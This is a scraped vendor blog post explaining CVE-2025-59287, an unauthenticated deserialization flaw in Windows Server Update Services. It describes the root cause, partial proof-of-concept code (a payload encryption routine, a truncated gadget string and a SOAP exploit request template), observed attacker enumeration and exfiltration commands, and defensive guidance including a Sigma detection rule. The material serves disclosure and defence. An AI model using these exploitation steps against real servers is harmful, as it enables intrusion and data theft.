Company About Us Leadership Careers Contact Customer Support Trust Center Picus in the News Subscribe to Our Newsletter Contact Us info@picussecurity.com Schedule a meeting Hey Al, learn about us Terms Security & Privacy Cookie Settings \u00a9 2025 Copyright. All rights reserved.",
    "filtered_content": "CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability Free Trial | Login Free Trial Login Platform Platform Picus Security Validation Platform Exposure Validation Security Control Validation Attack Surface Validation Cloud Security Validation Attack Path Validation Detection Rule Validation Integrations and Supported Technologies I want to Request a Demo Start a Trial REPORT Picus Red Report 2026 DATASHEET Security Validation Platform Use Cases Use Cases Breach and Attack Simulation Automated Penetration Testing Adversarial Exposure Validation Frameworks CTEM MITRE ATT&CK\u00ae Digital Operational Resiliency Act (DORA) Health Insurance Portability and Accountability Act (HIPAA) NIST Cybersecurity Framework (CSF) Industry Healthcare Financial Institutions IT/OT WHITEPAPER Building a Robust Defense-in-Depth Strategy with Breach and Attack Simulation (BAS) E-BOOK An Introduction to Exposure Validation Research RESEARCH Picus Labs Red Report Blue Report Actionable Threat Intelligence Report Emerging Threat Simulator LEARNING Emerging Threats Purple Academy Cybersecurity 101 Whitepaper Modernize Your SOC with Breach and Attack Simulation REPORT Blue Report: Effective Threat Exposure Management Resources RESOURCES Blog Reports Purple Academy Webinars Case Studies Datasheets Events Resource Library LEARNING Purple Academy Cybersecurity 101 Emerging Threats WHITEPAPER Double Your Threat Blocking in 90 Days E-BOOK An Introduction to Exposure Validation Company COMPANY About Us Leadership Press Releases Events Careers PARTNERS Partner Program Technology Alliance Program WATCH ON-DEMAND: The BAS Summit: Redefining Attack Simulation through AI DATASHEET The Pioneer of Breach & Attack Simulation GET A DEMO Home Blog CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability Picus Labs | 8 MIN READ | October 25, 2025 Summarize with: ChatGPT perplexity Google AI On 24 October 2025, Microsoft released an out-of-band security update for CVE-2025-59287 , a critical (CVSS 9.8) remote code execution vulnerability in the WSUS Server Role on Windows Server (2012/2012 R2, 2016, 2019, 2022, and 2025). The flaw stems from unsafe deserialization in WSUS\u2019s reporting web services, enabling a remote, unauthenticated attacker to send crafted requests and execute arbitrary code with SYSTEM privileges on a vulnerable server. Microsoft confirmed that the October Patch Tuesday update did not fully mitigate the issue and urged immediate deployment of the new out-of-band patches [1]. As exploitation activity has already been detected in the wild, making prompt remediation critical for all WSUS-enabled environments [2]. This blog examines the WSUS service, the root cause of CVE-2025-59287, available proof-of-concept exploits, and the recommended mitigation and workaround strategies. Simulate Vulnerability Exploitation Attacks with 14-Day Free Trial of Picus Platform What Is Windows Server Update Services (WSUS)? Windows Server Update Services (WSUS) is a Windows Server role that allows organizations to centrally manage, approve, and distribute Microsoft updates across all Windows endpoints in their environment. Instead of each machine connecting directly to Microsoft Update over the internet, WSUS acts as an internal update repository , improving control, bandwidth efficiency, and compliance. Client systems periodically communicate with the WSUS server over HTTP (port 8530) or HTTPS (port 8531) to request update metadata and download approved patches. Administrators can define update policies, automate deployment schedules, and monitor update status across the network, making WSUS a key infrastructure component in enterprise patch management and compliance operations. What Is the Technical Root Cause of CVE-2025-59287 RCE? The vulnerability lies within the WSUS component responsible for handling the AuthorizationCookie objects, specifically in the Microsoft.UpdateServices.Internal.Authorization.EncryptionHelper.DecryptData() method. The Deserialization Flaw The core issue is the use of the insecure .NET BinaryFormatter for deserializing encrypted cookie data without proper type validation. When an authorization cookie is received via the GetCookie() SOAP endpoint, the server attempts to decrypt and deserialize its contents. As shown in the provided source code snippet, after decryption, the data is passed directly to the BinaryFormatter.Deserialize() method if the object is not of the hardcoded type UnencryptedCookieData : // Source snippet from DecryptData method // ... (Decryption logic using AES-128-CBC) else { BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream memoryStream = new MemoryStream( array ); try { obj = binaryFormatter.Deserialize(memoryStream); // <-- VULNERABLE CALL } catch (Exception ex2) // ... if (obj.GetType() != this .classType) { throw new LoggedArgumentException( \"Decrypted cookie has the wrong data type. Expected type = \" + this .classType.ToString() + \", actual type = \" + obj.GetType().ToString(), \"cookieData\" ); } } return obj; } The use of BinaryFormatter.Deserialize() on arbitrary user-controllable input (the encrypted cookie data) is a classic unsafe deserialization vulnerability. An attacker can craft a malicious gadget chain payload (often generated using tools like ysoserial.net ) that, when deserialized by BinaryFormatter , forces the application to execute arbitrary code. Since the WSUS service often runs with high privileges (e.g., SYSTEM ), this leads to a critical RCE. Vulnerability Flow: GetCookie to RCE The exploitation flow is as follows. An unauthenticated attacker sends a crafted SOAP request to the /ClientWebService/Client.asmx endpoint, calling the GetCookie method. The request includes a specially constructed AuthorizationCookie with a CookieData field containing the encrypted malicious payload. The payload is a Base64-encoded, AES-128-CBC encrypted gadget chain. The request reaches the AuthorizationManager.GetCookie method, which calls CrackAuthorizationCookies , leading to CrackAuthorizationCookie , and finally to the vulnerable EncryptionHelper.DecryptData() . DecryptData uses a hardcoded AES key to decrypt the payload. The decrypted payload is deserialized by BinaryFormatter , executing the attacker's code with SYSTEM privileges . CVE-2025-59287 PoC: How Attackers Exploit WSUS Deserialization Flaw The exploitation involves two main parts: a payload generator and the SOAP request [3]. 1. Payload Generation (Encryption Logic) The following C# code snippet illustrates how the serialized gadget chain (from ysoserial.net ) is encrypted using the hardcoded key and an IV of all zeros: // Proof-of-Concept (PoC) Encryption Logic static byte[] EncryptPayload(byte[] data, byte[] key) { using (var aes = new AesCryptoServiceProvider()) { aes.Key = key; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.None; aes.IV = new byte[ 16 ]; // null IV byte[] salt = new byte[ 16 ]; new RNGCryptoServiceProvider().GetNonZeroBytes(salt); using (var encryptor = aes.CreateEncryptor()) { // ... (Custom block padding and transformation logic to match WSUS implementation) // The result is the encrypted cookie data including the salt/IV block. } } } The ysooo string below is a Base64-encoded serialized object (likely an IComparer gadget chain) that, upon deserialization, triggers a command like cmd.exe /c calc . // Serialized Gadget Chain (Partial, for illustration) string ysooo = \"AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCA...\" ; 2. SOAP Request Template The final encrypted payload ( [GENERATED PAYLOAD] ) is placed into the AuthorizationCookie element of a SOAP request to the GetCookie endpoint: POST /ClientWebService/Client.asmx HTTP/ 1.1 Host: WSUS-SERVER: 8530 Content-Type: text/xml; charset=utf -8 SOAPAction: \"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie\" Content-Length: 3632 <?xml version= \"1.0\" encoding= \"utf-8\" ?> <soap:Envelope xmlns:soap= \"http://schemas.xmlsoap.org/soap/envelope/\" > <soap:Body> <GetCookie xmlns= \"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService\" > <authCookies> <AuthorizationCookie> <PlugInId>SimpleTargeting</PlugInId> <CookieData>[GENERATED PAYLOAD]</CookieData> </AuthorizationCookie> </authCookies> <oldCookie xsi:nil= \"true\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" /> <protocolVersion> 1.20 </protocolVersion> </GetCookie> </soap:Body> </soap:Envelope> Observed Exploitation of CVE-2025-59287 in the Wild Threat actors have been observed actively exploiting this vulnerability in the wild, targeting exposed WSUS instances, often on the default ports 8530 and 8531 [2]. Attacker Tradecraft The typical attack chain involves: Sending the malicious SOAP request to the WSUS server. The RCE is triggered, spawning a command interpreter process. The observed process chains indicate execution via the main WSUS processes wsusservice.exe \u2192 cmd.exe \u2192 cmd.exe \u2192 powershell.exe and, w3wp.exe \u2192 cmd.exe \u2192 cmd.exe \u2192 powershell.exe The attacker executes an encoded PowerShell command for enumeration and data exfiltration . Observed commands include: whoami;net user /domain and net user /domain; ipconfig /all . The enumerated data is exfiltrated to a remote URL, often using curl.exe or iwr (Invoke-WebRequest) . Mitigation and Defense Immediate action is required to prevent compromise. Apply the Microsoft Out-of-Band Update Apply the security update released by Microsoft immediately. This patch addresses the vulnerability by implementing secure serialization mechanisms and/or strict type validation, preventing the deserialization of malicious object types. Refer to the official Microsoft Security Response Center (MSRC) advisory for the specific updates for your Windows Server version. Network Isolation and Hardening The vulnerability is unauthenticated and exploitable over the network. Restrict network access to the WSUS service ports ( 8530 /TCP and 8531 /TCP ) to only the clients and management hosts that explicitly require it. Blocking inbound traffic on these ports from the public internet is a critical defense-in-depth measure. Monitoring and Detection System administrators should immediately review logs for signs of exploitation. Artifact Description Detection Focus C:\\inetpub\\logs\\LogFiles\\W3SVC*\\u_ex*.log HTTP service logs POST requests to /ClientWebService/Client.asmx or other WSUS endpoints with large payload sizes or repeated access attempts. Process Creation Logs Windows Event Logs/EDR Child processes ( cmd.exe, powershell.exe ) spawned by wsusservice.exe or w3wp.exe (specifically the WSUS application pool). WSUS Log File C:\\Program Files\\Update Services\\Logfiles\\SoftwareDistribution.log Review for deserialization errors (e.g., System.Reflection.TargetInvocationException) . A Sigma rule for detecting the suspicious child process activity is provided below [2]. # Sigma Rule for Suspicious WSUS Child Process title: Suspicious Windows Update Service Child id: 622c4f64-c277-424a-9a1c-80c73d7243a0 status: experimental description: Detects the activity of a suspicious child spawning from Windows Update Service (WSUS), potential CVE-2025-59287. logsource: category: process_creation product: windows detection: selection_service: ParentImage|endswith: '\\wsusservice.exe' selection_w3wp: ParentImage|endswith: '\\w3wp.exe' ParentCommandLine|contains: 'wsuspool' Image|endswith: '\\cmd.exe' condition: selection_service or selection_w3wp How Picus Simulates WSUS CVE-2025-59287 Unauthenticated RCE Exploitation? We strongly recommend simulating exploited vulnerabilities targeting WSUS and safely emulating the adversarial behaviours observed in CVE-2025-59287 attack campaigns to verify how well your controls stop unauthenticated RCE and post-exploit activity. With the Picus Security Validation Platform , you can also test your defences against other high-profile vulnerabilities, for example CVE-2025-59287, Log4Shell, and ProxyLogon, in minutes using a 14-day free trial . Picus Threat Library includes the following threat for WSUS CVE-2025-59287 RCE attacks. Threat ID Threat Name Attack Module 99677 WSUS Web Attack Campaign Web Application Start simulating emerging threats today and get actionable mitigation insights with a 14-day free trial of the Picus Security Validation Platform. Key Takeaways Date & action: 24 Oct 2025 \u2014 Microsoft released an out-of-band patch for CVE-2025-59287 . Severity: Rated critical (CVSS 9.8) \u2014 unauthenticated remote code execution (RCE). Affected component: WSUS Server Role on Windows Server (2012/2012 R2, 2016, 2019, 2022, 2025). Root cause: Unsafe deserialization \u2014 insecure use of .NET BinaryFormatter in WSUS\u2019s reporting web services. Attack vector: Crafted SOAP requests to /ClientWebService/Client.asmx (GetCookie) containing a malicious AuthorizationCookie. Payload mechanics: Base64 \u2192 AES-128-CBC encrypted gadget chain (deserialized by BinaryFormatter) that triggers arbitrary code execution. Privilege impact: Code executes with SYSTEM privileges (WSUS typically runs at high privilege). Exploitation observed: Active exploitation in the wild \u2014 public PoCs and attacker campaigns reported. Why it\u2019s exploitable: Deserialization runs before strict type validation; BinaryFormatter.Deserialize() accepts attacker-controlled objects. Detection artifacts: suspicious POSTs to /ClientWebService/Client.asmx , large/odd CookieData fields, wsusservice.exe or w3wp.exe spawning cmd.exe \u2192 powershell.exe . Immediate recommendation: Prioritize applying Microsoft\u2019s OOB updates for affected OS versions (do not delay). References [1] \u201cSecurity Update Guide - Microsoft Security Response Center.\u201d Available: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287. [Accessed: Oct. 25, 2025] [2] C. Hudson, J. Maclachlan, J. Minton, J. Hammond, and L. O\u2019Donnell-Welch, \u201cExploitation of Windows Server Update Services Remote Code Execution Vulnerability (CVE-2025-59287),\u201d Huntress. Available: https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability. [Accessed: Oct. 25, 2025] [3] HawkTrace, \u201cCVE-2025-59287 WSUS Remote Code Execution,\u201d HawkTrace Research, Oct. 14, 2025. Available: https://hawktrace.com/blog/CVE-2025-59287. [Accessed: Oct. 25, 2025] Share this: Table of Contents Ready to start? Emerging Threat CVE-2026-21509: APT28 Exploits Microsoft Office Zero-day Vulnerability Learn More Emerging Threat Ni8mare: n8n CVE-2026-21858 Remote Code Execution Vulnerability Explained Learn More Emerging Threat React2Shell RCE Vulnerability: CVE-2025-55182 and CVE-2025-66478 Explained Learn More Emerging Threat FortiWeb CVE-2025-64446 Vulnerability: Path Traversal Leads to Remote Code Execution Learn More Emerging Threat CVE-2025-59287 Explained: WSUS Unauthenticated RCE Vulnerability Learn More Emerging Threat Earth Krahang APT Group: Global Government Cyberespionage Campaigns (2022\u20132024) and TTP Analysis Learn More Emerging Threat WARMCOOKIE: A Technical Deep Dive into a Persistent Backdoor's Evolution Learn More Emerging Threat Lazarus Group (APT38) Explained: Timeline, TTPs, and Major Attacks Learn More Emerging Threat Scattered LAPSUS$ Hunters: 2025's Most Dangerous Cybercrime Supergroup Learn More Get the Latest Insights Delivered Straight to Your Inbox Platform The Security Validation Platform Security Control Validation Attack Surface Validation Cloud Security Validation Attack Path Validation Detection Rule Validation Integrations Use Cases Breach and Attack Simulation Automated Penetration Testing Adversarial Exposure Validation Resources Blog Purple Academy Webinars Reports Case Studies Press Releases Datasheets Cyberpedia Events Company About Us Leadership Careers Contact Customer Support Trust Center Picus in the News Subscribe to Our Newsletter Contact Us info@picussecurity.com Schedule a meeting Hey Al, learn about us Terms Security & Privacy Cookie Settings \u00a9 2025 Copyright. All rights reserved.",
    "expected_count": 2
  }
]